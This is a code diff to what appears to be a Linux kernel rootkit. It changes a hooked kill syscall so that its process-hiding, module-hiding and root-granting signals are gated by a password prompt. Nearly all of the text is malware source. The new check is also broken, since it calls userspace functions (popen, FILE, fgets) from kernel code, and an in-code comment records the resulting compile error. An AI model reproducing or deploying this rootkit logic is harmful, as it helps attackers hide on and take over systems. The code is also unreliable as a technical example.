@@ -3,11 +3,8 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h> 
+#include <linux/version.h>
 #include <stdio.h>//ADDED
-#include <stdlib.h>//ADDED
-
-#define BUFFER_SIZE 1024//ADDED
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -332,28 +329,9 @@ hacked_kill(pid_t pid, int sig)
 	bool pwTried = FALSE;
 	bool pwPassed = FALSE;
 	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
-		pwPassed = TRUE;
-		FILE *fp;//DEBUG TODO: error "unknown type name FILE" (its in stdio.h)
-		char path[BUFFER_SIZE];
-		char output[BUFFER_SIZE] = "read -p \"Enter: \" -s pw && echo \"$pw\""; // Allocate a buffer to hold the output
-		char* command = "echo "; // Command to execute
-		fp = popen(command, "r"); // Open the command for reading
-		if (fp != NULL) { // Check if popen failed
-			// Read the output of the command and copy it to the output buffer
-			fgets(path, sizeof(path)-1, fp);
-			for (int i = 0; i < BUFFER_SIZE && path[i] != '\0'; i++) {
-				output[i] = path[i];
-			}
-			pclose(fp); // Close the pipe
-			// Compare the output to the string "test"
-			char test[] = MAGIC_PREFIX;
-			for (int i = 0; i < BUFFER_SIZE && output[i] != '\0' && test[i] != '\0'; i++) {
-				if (output[i] != test[i]) {
-					pwPassed = FALSE;
-					break;
-				}
-			}
-		} else { pwPassed = FALSE; }
+		char output[400];
+    	FILE *cmd_output = popen("read -p \"Enter: \" -s pw && echo \"$pw\"", "r");
+    	if (cmd_output!=NULL && fgets(output,sizeof(output), cmd_output)!=NULL && strcmp(output,MAGIC_PREFIX)==0) { pwPassed = TRUE; }
 		pwTried = TRUE;
 	}
 
